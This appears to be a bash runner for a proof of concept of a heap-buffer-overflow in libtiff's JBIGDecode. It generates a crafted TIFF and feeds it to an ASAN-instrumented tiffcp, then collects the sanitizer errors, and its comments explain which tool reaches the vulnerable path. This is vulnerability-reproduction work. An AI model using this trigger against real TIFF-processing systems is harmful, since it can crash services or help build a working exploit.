#!/bin/bash
# PoC runner for VULN-001: JBIGDecode heap-buffer-overflow (tif_jbig.c:125)
#
# Trigger: tiffcp -c none (transcodes to uncompressed, forces TIFFReadEncodedStrip
#          -> JBIGDecode -> _TIFFmemcpy overflow)
#
# tiffsplit is NOT used here because it calls TIFFReadRawStrip which bypasses
# the codec layer entirely (JBIGDecode is never invoked by tiffsplit).
# tiffcp is in the same ASAN+UBSAN build directory.
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
POC_TIFF="${SCRIPT_DIR}/vuln_001.tif"
RESULT="${SCRIPT_DIR}/vuln_001_result.txt"
ASAN_LOG="${SCRIPT_DIR}/asan.log"
TIFFCP="/data/ylwang/non-textfuzz/target/libtiff/build_test/bin/tiffcp"

# 1. Generate vuln_001.tif if not present
if [ ! -f "${POC_TIFF}" ]; then
    python3 "${SCRIPT_DIR}/vuln_001_gen.py"
fi

# 2. Run tiffcp and capture stdout+stderr
ASAN_OPTIONS="abort_on_error=0:log_path=${ASAN_LOG}" \
    "${TIFFCP}" -c none "${POC_TIFF}" /tmp/tiffsplit_out_001.tif \
    > "${RESULT}" 2>&1 || true

# 3. Append ASAN/UBSAN errors from log files
for f in "${ASAN_LOG}".*; do
    [ -f "$f" ] && grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" \
        >> "${RESULT}" || true
done
